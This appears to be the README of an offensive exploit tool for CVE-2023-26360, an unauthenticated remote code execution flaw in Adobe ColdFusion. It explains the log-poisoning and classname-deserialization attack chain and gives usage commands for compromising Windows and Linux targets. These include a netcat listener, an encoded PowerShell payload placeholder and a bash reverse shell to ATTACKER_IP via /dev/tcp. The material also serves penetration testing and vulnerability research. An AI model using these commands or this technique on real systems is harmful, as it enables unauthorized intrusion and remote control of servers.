# CVE-2023-26360 — Adobe ColdFusion Unauthenticated RCE

Python implementation of the remote code execution exploit for CVE-2023-26360, based on analysis of the original [Metasploit module](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/adobe_coldfusion_rce_cve_2023_26360.rb) and the prior work by [jakabakos](https://github.com/jakabakos/CVE-2023-26360-adobe-coldfusion-rce-exploit).

## Why this exists

The jakabakos PoC attempts to inject `<cfexecute>` directly into the `_variables` parameter and read the output from the ColdFusion log in a single step. This approach fails because ColdFusion does not evaluate CFML tags inline in that context, resulting in a `500` error with no code execution.

This implementation replicates the correct two-step mechanism used by the Metasploit module:

1. **Log poisoning** — sends a malformed `_variables` payload (`{<cftry>CFML</cftry>`) to the vulnerable CFC endpoint. ColdFusion fails to parse it and writes the raw content — including the CFML code — into `coldfusion-out.log`.
2. **Template execution** — uses the classname deserialization vulnerability to load the poisoned log file as a ColdFusion template, causing the server to execute the injected CFML.

Command execution is performed via `java.lang.Runtime.exec()` through `createObject`, avoiding any dependency on `<cfexecute>`, which is typically disabled in hardened or production deployments.

## Affected versions

- Adobe ColdFusion 2021 Update 5 and earlier
- Adobe ColdFusion 2018 Update 15 and earlier

## Requirements

```bash
pip install -r requirements.txt
```

## Usage

Start a listener before running the exploit:

```bash
nc -lvnp 4444
```

**Windows target:**
```bash
python exploit.py --host http://TARGET:8500 --win --cmd "powershell -e <BASE64_PAYLOAD>"
```

**Linux target:**
```bash
python exploit.py --host http://TARGET:8500 --cmd "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
```

**Through a proxy (e.g. Burp Suite):**
```bash
python exploit.py --host http://TARGET:8500 --win --cmd "whoami" --proxy http://127.0.0.1:8080
```

## Options

| Flag | Description |
|------|-------------|
| `--host` | Target base URL (e.g. `http://192.168.1.10:8500`) |
| `--cmd` | Command to execute on the target |
| `--win` | Set this flag if the target is a Windows host |
| `--proxy` | Optional HTTP proxy URL |

## How it works

```
┌─────────────┐         Step 1: plant CFML          ┌──────────────────┐
│   Attacker  │ ──── POST /_variables={<cftry>...  ──► iedit.cfc        │
│             │      CF fails to parse, logs CFML     │                  │
│             │                                       │ coldfusion-      │
│             │         Step 2: trigger execution     │ out.log          │
│             │ ──── POST classname=X..\logs\cf... ──► (loaded as       │
│             │                                       │  CFML template)  │
│  Listener   │ ◄─────────────── reverse shell ───────│                  │
└─────────────┘                                       └──────────────────┘
```

## References

- [Adobe Security Advisory](https://helpx.adobe.com/security/products/coldfusion/apsb23-25.html)
- [Rapid7 Analysis — AttackerKB](https://attackerkb.com/topics/F36ClHTTIQ/cve-2023-26360)
- [Metasploit Module](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/adobe_coldfusion_rce_cve_2023_26360.rb)
- [jakabakos PoC](https://github.com/jakabakos/CVE-2023-26360-adobe-coldfusion-rce-exploit)

## Disclaimer

This tool is provided for educational purposes and authorized security assessments only (penetration tests, CTFs, lab environments). Running this exploit against systems without explicit written permission is illegal. The author assumes no liability for any misuse.
